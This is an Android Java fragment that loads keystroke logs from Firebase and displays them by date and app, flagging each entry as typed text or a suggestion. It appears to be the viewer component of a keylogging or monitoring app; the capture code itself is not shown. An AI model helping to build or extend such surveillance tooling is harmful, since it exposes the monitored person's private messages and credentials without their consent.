package com.vikasyadavnsit.cdc.fragment;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Spinner;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class KeyStrokesFragment extends Fragment {

    private Spinner dateSpinner;
    private RecyclerView logsRv;
    private TextView emptyView;
    
    private AppAdapter appAdapter;
    private LogAdapter logAdapter;
    
    private String selectedDate;
    private String selectedApp;
    
    private final List<String> availableDates = new ArrayList<>();
    private final List<String> availableApps = new ArrayList<>();
    private final List<KeyStrokeData> keystrokeLogs = new ArrayList<>();

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_key_strokes, container, false);
        
        view.findViewById(R.id.keystrokes_back_button).setOnClickListener(v -> getParentFragmentManager().popBackStack());
        view.findViewById(R.id.keystrokes_refresh_button).setOnClickListener(v -> loadDates());
        
        dateSpinner = view.findViewById(R.id.keystrokes_date_spinner);
        RecyclerView appsRv = view.findViewById(R.id.keystrokes_apps_rv);
        logsRv = view.findViewById(R.id.keystrokes_logs_rv);
        emptyView = view.findViewById(R.id.keystrokes_empty_view);

        appsRv.setLayoutManager(new LinearLayoutManager(getContext(), LinearLayoutManager.HORIZONTAL, false));
        appAdapter = new AppAdapter();
        appsRv.setAdapter(appAdapter);

        logsRv.setLayoutManager(new LinearLayoutManager(getContext()));
        logAdapter = new LogAdapter();
        logsRv.setAdapter(logAdapter);

        loadDates();
        
        return view;
    }

    private void loadDates() {
        FirebaseUtils.getAndroidUserKeystrokeDates(dates -> {
            if (!isAdded()) return;
            availableDates.clear();
            availableDates.addAll(dates);
            
            if (dates.isEmpty()) {
                showEmpty(true);
                return;
            }

            ArrayAdapter<String> adapter = new ArrayAdapter<String>(requireContext(), android.R.layout.simple_spinner_item, availableDates) {
                @NonNull
                @Override
                public View getView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                    TextView tv = (TextView) super.getView(position, convertView, parent);
                    tv.setTextColor(getResources().getColor(R.color.text_primary));
                    return tv;
                }

                @Override
                public View getDropDownView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                    TextView tv = (TextView) super.getDropDownView(position, convertView, parent);
                    tv.setTextColor(getResources().getColor(R.color.text_primary));
                    return tv;
                }
            };
            adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            
            dateSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
                @Override
                public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                    selectedDate = availableDates.get(position);
                    loadAppsForDate(selectedDate);
                }
                @Override public void onNothingSelected(AdapterView<?> parent) {}
            });
            
            dateSpinner.setAdapter(adapter);

            // Auto select today if available, otherwise select first available date
            String today = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
            int todayIdx = availableDates.indexOf(today);
            if (todayIdx != -1) {
                dateSpinner.setSelection(todayIdx);
            } else if (!availableDates.isEmpty()) {
                dateSpinner.setSelection(0);
                // Manually trigger if setSelection(0) doesn't fire (already at 0)
                selectedDate = availableDates.get(0);
                loadAppsForDate(selectedDate);
            }
        });
    }

    private void loadAppsForDate(String date) {
        FirebaseUtils.getAndroidUserKeystrokeApps(date, apps -> {
            if (!isAdded()) return;
            availableApps.clear();
            availableApps.addAll(apps);
            selectedApp = null;
            appAdapter.notifyDataSetChanged();
            
            if (!apps.isEmpty()) {
                // Auto select first app
                selectedApp = apps.get(0);
                appAdapter.notifyDataSetChanged();
                loadLogsForApp(date, selectedApp);
            } else {
                keystrokeLogs.clear();
                logAdapter.notifyDataSetChanged();
                appAdapter.notifyDataSetChanged();
                showEmpty(true);
            }
        });
    }

    private void loadLogsForApp(String date, String app) {
        FirebaseUtils.getAndroidUserKeystrokes(date, app, new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!isAdded()) return;
                keystrokeLogs.clear();
                for (DataSnapshot child : snapshot.getChildren()) {
                    KeyStrokeData data = child.getValue(KeyStrokeData.class);
                    if (data != null) keystrokeLogs.add(0, data); // Newest first
                }
                logAdapter.notifyDataSetChanged();
                showEmpty(keystrokeLogs.isEmpty());
            }

            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private void showEmpty(boolean show) {
        emptyView.setVisibility(show ? View.VISIBLE : View.GONE);
        logsRv.setVisibility(show ? View.GONE : View.VISIBLE);
    }

    // ── Adapters ─────────────────────────────────────────────────────────────

    private class AppAdapter extends RecyclerView.Adapter<AppAdapter.ViewHolder> {
        @NonNull @Override public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            return new ViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.item_keystroke_app, parent, false));
        }

        @Override public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            String appName = availableApps.get(position);
            holder.name.setText(appName);
            
            boolean isSelected = appName.equals(selectedApp);
            holder.itemView.setAlpha(isSelected ? 1.0f : 0.6f);
            holder.itemView.setScaleX(isSelected ? 1.05f : 1.0f);
            holder.itemView.setScaleY(isSelected ? 1.05f : 1.0f);
            
            holder.itemView.setOnClickListener(v -> {
                selectedApp = appName;
                notifyDataSetChanged();
                loadLogsForApp(selectedDate, selectedApp);
            });
        }

        @Override public int getItemCount() { return availableApps.size(); }

        static class ViewHolder extends RecyclerView.ViewHolder {
            TextView name;
            ViewHolder(View v) { super(v); name = v.findViewById(R.id.keystroke_app_name); }
        }
    }

    private class LogAdapter extends RecyclerView.Adapter<LogAdapter.ViewHolder> {
        @NonNull @Override public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            return new ViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.item_keystroke_log, parent, false));
        }

        @Override public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            KeyStrokeData data = keystrokeLogs.get(position);
            String time = "Unknown";
            try {
                long ts = Long.parseLong(data.getTimestamp());
                time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(ts));
            } catch (Exception ignored) {}
            
            holder.time.setText(time);
            holder.text.setText(data.getText());

            // Add indicator for typed vs suggestion
            if (data.isTyped()) {
                holder.typeBadge.setText("TYPED");
                holder.typeBadge.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF4CAF50)); // Green
            } else {
                holder.typeBadge.setText("UI/SUGGESTION");
                holder.typeBadge.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF2196F3)); // Blue
            }
        }

        @Override public int getItemCount() { return keystrokeLogs.size(); }

        static class ViewHolder extends RecyclerView.ViewHolder {
            TextView time, text, typeBadge;
            ViewHolder(View v) {
                super(v);
                time = v.findViewById(R.id.keystroke_log_time);
                text = v.findViewById(R.id.keystroke_log_text);
                typeBadge = v.findViewById(R.id.keystroke_log_type_badge);
            }
        }
    }
}
